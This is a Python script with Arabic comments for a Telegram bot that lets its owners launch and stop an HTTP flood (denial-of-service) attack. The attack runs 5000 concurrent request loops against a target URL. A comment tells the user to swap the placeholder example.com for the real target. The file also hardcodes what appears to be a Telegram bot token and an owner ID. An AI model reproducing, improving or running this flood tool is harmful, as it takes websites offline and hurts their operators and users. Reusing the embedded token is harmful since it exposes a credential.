import aiohttp
import asyncio
import logging
import time
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# إعداد السجلات
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# متغير لتخزين عدد البايتات المنقولة
bytes_transferred = 0
lock = asyncio.Lock()

# متغير لإيقاف الهجوم
stop_attack_event = asyncio.Event()

# قائمة المالكين
Owner = ['6358035274']
NormalUsers = []

# قراءة القوائم من الملفات
def load_lists():
    global Owner, NormalUsers
    try:
        with open('owner.txt', 'r') as file:
            Owner = file.read().splitlines()
        with open('normal_users.txt', 'r') as file:
            NormalUsers = file.read().splitlines()
    except FileNotFoundError:
        logging.warning("لم يتم العثور على ملفات القوائم. سيتم استخدام القوائم الفارغة.")
        pass

load_lists()

# دالة الهجوم
async def attack(session, url):
    global bytes_transferred
    while not stop_attack_event.is_set():
        try:
            async with session.get(url) as response:
                content = await response.read()
                async with lock:
                    bytes_transferred += len(content)
                logging.info(f"تم إرسال الطلب إلى: {url}")
        except Exception as e:
            logging.error(f"حدث خطأ: {e}")

# بدء الهجوم
async def start_attack(url):
    stop_attack_event.clear()
    async with aiohttp.ClientSession() as session:
        tasks = [asyncio.create_task(attack(session, url)) for _ in range(5000)]
        await asyncio.gather(*tasks)

# إيقاف الهجوم
def stop_attack():
    stop_attack_event.set()
    logging.info("تم إيقاف الهجوم.")

# حساب سرعة النقل
async def calculate_speed():
    global bytes_transferred
    while not stop_attack_event.is_set():
        await asyncio.sleep(1)
        async with lock:
            speed = bytes_transferred / (1024 * 1024)  # تحويل البايتات إلى ميغابايت
            bytes_transferred = 0
        logging.info(f"سرعة النقل: {speed:.2f} MB/s")

# إنشاء البوت باستخدام التوكن الخاص بك
TOKEN = '7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4'
bot = telebot.TeleBot(TOKEN)

# تحقق من صحة المالك
def is_owner(user_id):
    return str(user_id) in Owner

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_owner(message.from_user.id):
        bot.reply_to(message, "مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
        # إنشاء الأزرار التفاعلية إذا كان المستخدم مالكًا
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("إضافة مستخدم", callback_data="add_user"))
        markup.add(InlineKeyboardButton("إزالة مستخدم", callback_data="remove_user"))
        markup.add(InlineKeyboardButton("بدء هجوم", callback_data="start_attack"))
        markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
        bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)
    else:
        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")

@bot.callback_query_handler(func=lambda call: is_owner(call.message.chat.id))
def callback_query(call):
    if call.data == "start_attack":
        # بدء الهجوم في حلقة asyncio
        asyncio.run(start_attack('http://example.com'))  # استبدل URL بالهدف الحقيقي
    elif call.data == "stop_attack":
        stop_attack()

# تشغيل حساب سرعة النقل في حلقة asyncio
async def main():
    await calculate_speed()

# بدء حلقة asyncio
if __name__ == "__main__":
    asyncio.run(main())
